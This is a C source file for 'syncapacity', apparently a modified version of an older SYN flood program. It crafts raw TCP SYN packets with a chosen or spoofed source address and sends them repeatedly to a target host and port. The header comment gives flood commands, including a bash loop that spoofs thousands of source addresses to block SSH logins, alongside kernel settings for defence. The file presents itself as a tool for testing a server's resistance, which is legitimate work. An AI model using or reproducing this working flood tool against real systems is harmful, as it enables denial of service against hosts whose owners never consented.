/* 

  Base on original work of Mike Chirico 

  Copyright GPL 2007 by Manfred Furuholmen <fabrizio.manfredi@gmail.com>
  Copyright GPL 2003 by Mike Chirico <mchirico@users.sourceforge.net>


  How to use this program.

   You must run this program as root, since it generates raw sockets. The
   following example does a ping SYN flood against 192.168.1.71 2000000 time
   on port 80.

     $./syncapacity -s 192.168.1.155 -d 192.168.1.71 -n 2000000 -p 80 


  How do you prevent against such an attack? See the following article:
        http://souptonuts.sourceforge.net/tcpdump_tutorial.html




  References:
    $ man packet

    http://www.infosecwriters.com/text_resources/pdf/raw_tcp.pdf
    http://www.linuxjournal.com/article/4659
    http://www.cs.huji.ac.il/labs/danss/planetlab/SafeRawSockets.pdf
    http://www.securityfocus.com/infocus/1729
    http://post.doit.wisc.edu/linux/secure.html
    http://staff.washington.edu/dittrich/misc/ddos/
    http://www.ibr.cs.tu-bs.de/lehre/ws0405/sec/uebung/uebung4.pdf
    ftp://rtfm.mit.edu/pub/usenet-by-group/comp.unix.programmer/Raw_IP_Networking_FAQ

  ##### Begin DoS Prevention #####                                          
  # shut some DoS stuff down                                                
  echo 1 > /proc/sys/net/ipv4/tcp_syncookies                                
  echo 1 > /proc/sys/net/ipv4/icmp_ignore_bogus_error_responses             
  echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts                   
                                                                            
  # increase the local port range                                           
  echo 1024 65535 > /proc/sys/net/ipv4/ip_local_port_range                  
                                                                            
  # increase the SYN backlog queue                                          
  echo 2048 > /proc/sys/net/ipv4/tcp_max_syn_backlog                        
                                                                            
  echo 0 > /proc/sys/net/ipv4/tcp_sack                                      
  echo 0 > /proc/sys/net/ipv4/tcp_timestamps                                
                                                                            
  echo 64000 > /proc/sys/fs/file-max                                        
                                                                            
  ulimit -n 64000                                                           


 Run the following on a client to test a server against DOS. Below the following
 works against port 22. You will not be able to login.

     #!/bin/bash
     for j in `seq 254`                                             
     do                                                             
      for i in `seq 256`                                            
      do                                                            
       ./syncapacity -s "192.168.$j.$i" -d 192.168.1.71 -p 22 -n 1   
      done                                                          
     done                                              

  While the above is running issue the following command on the server.

    $ echo 1 > /proc/sys/net/ipv4/tcp_syncookies

  Also take a look at the number of half-open connections.

    $ netstat -n -t|grep 'SYN_RECV'             

  

  If you want to set the SackOK

    $ ./syncapacity -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1 -w 4 -x 2

  Or if you want to set SackOK and mss to 1460

    $ ./syncapacity -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1 -w 4 -x 2 -y 2 -z 4 -g 5 -h 180

  References for TCP options:
    http://www.packetshack.org/index.php?page=decode_tcp_opt
                                                                            

*/


#define __USE_BSD	
#include <sys/socket.h>	
#include <netinet/in.h>	
#include <arpa/inet.h>
#define __FAVOR_BSD	
#include <unistd.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <pthread.h>

struct ip {
#if BYTE_ORDER == LITTLE_ENDIAN
	u_int	ip_hl:4,		/* header length */
		ip_v:4;			/* version */
#endif
#if BYTE_ORDER == BIG_ENDIAN
	u_int	ip_v:4,			/* version */
		ip_hl:4;		/* header length */
#endif
	u_char	ip_tos;			/* type of service */
	u_short	ip_len;			/* total length */
	u_short	ip_id;			/* identification */
	u_short	ip_off;			/* fragment offset field */
#define	IP_RF 0x8000			/* reserved fragment flag */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
	u_char	ip_ttl;			/* time to live */
	u_char	ip_p;			/* protocol */
	u_short	ip_sum;			/* checksum */
	struct	in_addr ip_src,ip_dst;	/* source and dest address */
} __packed;
typedef	u_int32_t tcp_seq;
typedef u_int32_t tcp_cc;		/* connection count per rfc1644 */

struct tcphdr {
	u_short	th_sport;		/* source port */
	u_short	th_dport;		/* destination port */
	tcp_seq	th_seq;			/* sequence number */
	tcp_seq	th_ack;			/* acknowledgement number */
#if BYTE_ORDER == LITTLE_ENDIAN
	u_int	th_x2:4,		/* (unused) */
		th_off:4;		/* data offset */
#endif
#if BYTE_ORDER == BIG_ENDIAN
	u_int	th_off:4,		/* data offset */
		th_x2:4;		/* (unused) */
#endif
	u_char	th_flags;
#define	TH_FIN	0x01
#define	TH_SYN	0x02
#define	TH_RST	0x04
#define	TH_PUSH	0x08
#define	TH_ACK	0x10
#define	TH_URG	0x20
#define	TH_ECE	0x40
#define	TH_CWR	0x80
#define	TH_FLAGS	(TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)

	u_short	th_win;			/* window */
	u_short	th_sum;			/* checksum */
	u_short	th_urp;			/* urgent pointer */
};

struct tcp_options
{
  u_int8_t op0;
  u_int8_t op1;
  u_int8_t op2;
  u_int8_t op3;
  u_int8_t op4;
  u_int8_t op5;
  u_int8_t op6;
  u_int8_t op7;
};
pthread_mutex_t fakeMutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t fakeCond = PTHREAD_COND_INITIALIZER;
void thread_wait(int timeInSec)
{
	struct timespec timeToWait;
	struct timeval now;
	int rt;

	gettimeofday(&now,NULL);

	timeToWait.tv_sec = now.tv_sec ;
	timeToWait.tv_nsec = now.tv_usec*1000 + timeInSec;

	pthread_mutex_lock(&fakeMutex);
	rt = pthread_cond_timedwait(&fakeCond, &fakeMutex, &timeToWait);
	pthread_mutex_unlock(&fakeMutex);

}

char datagram[4096]; /* datagram buffer */
char pheader[1024]; /* pseudoheader buffer for computing tcp checksum */

uint16_t  csum (uint16_t * addr, int len)
{
  int nleft = len;
  uint32_t sum = 0;
  uint16_t *w = addr;
  uint16_t answer = 0;

  while( nleft > 1 ) {
    sum += *w++;
    nleft -= 2;
  }
  if (nleft == 1) {
    *(unsigned char *)  (&answer) = *(unsigned char *) w;
    sum += answer;
  }
  sum = (sum >> 16)+(sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

int main(int argc, char **argv)
{

  int flags = 0, c, numtries=90;
  char src_ip[17];
  char dst_ip[17];
  short dst_port=80;
  short th_sport=1234;
  short tcp_flags=TH_SYN;
  short pig_ack=0;
  struct ip *iph = (struct ip *) datagram;
  struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
  struct tcp_options *tcpopt = (struct tcp_options *) (datagram + sizeof(struct ip) + sizeof(struct tcphdr));
  struct sockaddr_in servaddr;
  memset(datagram, 0, 4096); /* zero out the buffer */

  fprintf(stderr,"sizeof (struct ip)= %d\n",sizeof(struct ip));
  

  snprintf(src_ip,16,"%s","192.168.8.12");  //default
  int num =0;
  while ((c = getopt(argc, argv, "s:d:n:p:f:a:q:w:x:y:z:g:h:i:j:")) != -1) {
    switch (c) {
    case 's':
      flags |= 0x1;
      snprintf(src_ip,16,"%s",optarg);
      break;
    case 'd':
      flags |= 0x2;
      snprintf(dst_ip,16,"%s",optarg);
      break;
    case 'n':
      flags |= 0x4;
      numtries=atoi(optarg);
      break;
    case 'p':
      flags |= 0x8;
      dst_port=atoi(optarg);
      break;
    case 'f':
      tcp_flags=atoi(optarg);
      break;
    case 'a':
      pig_ack=atoi(optarg);
      break;
    case 'q':
      th_sport=atoi(optarg);
      break;
    case 'w':
      tcpopt->op0=atoi(optarg);
      break;
    case 'x':
      tcpopt->op1=atoi(optarg);
      break;
    case 'y':
      tcpopt->op2=atoi(optarg);
      break;
    case 'z':
      tcpopt->op3=atoi(optarg);
      break;
    case 'g':
      tcpopt->op4=atoi(optarg);
      break;
    case 'h':
      tcpopt->op5=atoi(optarg);
      break;
    case 'i':
      tcpopt->op6=atoi(optarg);
      break;
    case 'j':
      tcpopt->op7=atoi(optarg);
      break;
    case '?':
      flags |= 0x10;
      fprintf(stderr, "Unrecognized option  \n");
      break;
    }
  }

  if(! ( flags & 0x2  ) ) {
    fprintf(stderr,"\nsyncapacity -s <source ip> -d <destination ip> -p <port> -n <number of SYN floods>\n");
    fprintf(stderr,"\nYou must give me a destination\n");
    fprintf(stderr,"  Example:\n\t\t./syncapacity -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1\n");
    fprintf(stderr,"  Or with SackOK :\n\t\t./syncapacity -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1 -w 4 -x 2\n");
    fprintf(stderr,"  SackOK and mss 1460:\n\t\t./syncapacity -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1 -w 4 -x 2 -y 2 -z 4 -g 5 -h 180\n");




    return 1;

  }
  if(getuid( )){
    fprintf(stderr,"\n Also, you must be root to run this program:  ./su -c \"./syncapacity -s <source ip> -d <destination ip> -p 80 -n 2000\"\n");
    return 1;
  }

  fprintf(stdout,"src %s dst %s number of tries %d\n",src_ip,dst_ip,numtries);






  int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP); /* open raw socket */
  servaddr.sin_family = AF_INET;
  // servaddr.sin_port = htons (10000);
  //OLD WAY  servaddr.sin_addr.s_addr = inet_addr (dst_ip); /* destination ip */
  inet_pton(AF_INET, dst_ip,&servaddr.sin_addr);
  int tcphdr_size = sizeof(struct tcphdr);

  iph->ip_hl = 5;
  iph->ip_v = 4;
  iph->ip_tos = 0;
  iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr) + 8 +6 +6; /* data size = 0, but tcp using option flags */
  iph->ip_id = htons (31337);
  iph->ip_off = 0;
  iph->ip_ttl = 250;
  iph->ip_p = 6;
  iph->ip_sum = 0;
  //OLD WAY iph->ip_src.s_addr = inet_addr (src_ip);/* source ip  */
  inet_pton(AF_INET, src_ip, &(iph->ip_src));
  iph->ip_dst.s_addr = servaddr.sin_addr.s_addr;

  tcph->th_sport = htons (th_sport); /* source port */
  tcph->th_dport = htons (dst_port); /* destination port */
  tcph->th_seq = htonl(31337);
  tcph->th_ack = htonl(pig_ack);/* in first SYN packet, ACK is not present */
  tcph->th_x2 = 0;
  // tcph->th_off = sizeof(struct tcphdr)/4; /* data position in the packet */
  // Special chirico adjustment to give 2x32
  tcph->th_off = 7+2+1 ;

  fprintf(stderr,"Data offset %d  sizeof(struct tcphdr)=%d\n",tcph->th_off,sizeof(struct tcphdr));
  /*
#  define TH_FIN        0x01
#  define TH_SYN        0x02
#  define TH_RST        0x04
#  define TH_PUSH       0x08
#  define TH_ACK        0x10
#  define TH_URG        0x20




  */



  tcph->th_flags = tcp_flags; /* initial connection request */
  tcph->th_win = htons (57344); /* FreeBSD uses this value too */
  tcph->th_sum = 0; /* we will compute it later */
  tcph->th_urp = 0;
  if (tcphdr_size % 4 != 0) /* takes care of padding to 32 bits */
    tcphdr_size = ((tcphdr_size % 4) + 1) * 4;
  fprintf(stderr,"tcphdr_size %d\n",tcphdr_size);
  tcphdr_size=40;
  fprintf(stderr,"tcphdr_size %d\n",tcphdr_size);

  memset(pheader,0x0,sizeof(pheader));
  memcpy(&pheader,&(iph->ip_src.s_addr),4);
  memcpy(&pheader[4],&(iph->ip_dst.s_addr),4);
  pheader[8]=0; // just to underline this zero byte specified by rfc
  pheader[9]=(u_int16_t)iph->ip_p;
  pheader[10]=(u_int16_t)(tcphdr_size & 0xFF00)>>8;
  pheader[11]=(u_int16_t)(tcphdr_size & 0x00FF);

  /* tcpopt->op0=4;   sackOK 
     tcpopt->op1=2;
  */
  memcpy(&pheader[12], tcph, sizeof(struct tcphdr));
  memcpy(&pheader[12+ sizeof(struct tcphdr)], tcpopt, sizeof(struct tcp_options));

  fprintf(stderr,"12+sizeof(struct tcphdr)= %d    %d\n",12+sizeof(struct tcphdr),sizeof(struct tcp_options));
  /* This is an example of setting SackOK we need to set it in the
     header for checksum and in the actual data.  This should only get
     sent when using SYN? */

  //pheader[32]=4;
  //  pheader[33]=2;

    //datagram[40]=4;
    //datagram[41]=2;



    fprintf(stderr,"********** %d %d\n",tcpopt->op0,datagram[40]);
    fprintf(stderr,"********** %d %d\n",tcpopt->op1,datagram[41]);


    fprintf(stderr,"csum size is %d\n",tcphdr_size+12);



     

  tcph->th_sum = csum ((uint16_t *) (pheader),tcphdr_size+12);


  //  iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);

  int one = 1;
  const int *val = &one;
  if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0){
    fprintf(stderr,"Error: setsockopt. You need to run this program as root\n");
      return -1;
    }


  int modval= numtries / 15;
  if (modval < 2) modval = 2;
  int ft=0;
  while(numtries-- > 0)
    {

     
     if (sendto (s,datagram,iph->ip_len ,0,(struct sockaddr *) &servaddr, sizeof (servaddr)) < 0)
      {
        fprintf(stderr,"Error in sendto\n");
        exit(1);
      } else {

        if(ft==0) {
          fprintf(stderr,"[****************]\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b");
          ft=1;
	}
 
	if ( (numtries % modval) == 0 )
	  fprintf(stderr,".");

      }
	  num ++;
	  if(num % 25 == 0)
	   thread_wait(1);
    }



  fprintf(stderr,"sizeof(struct tcp_options)=%d\n",sizeof(struct tcp_options));
  return 0;
}


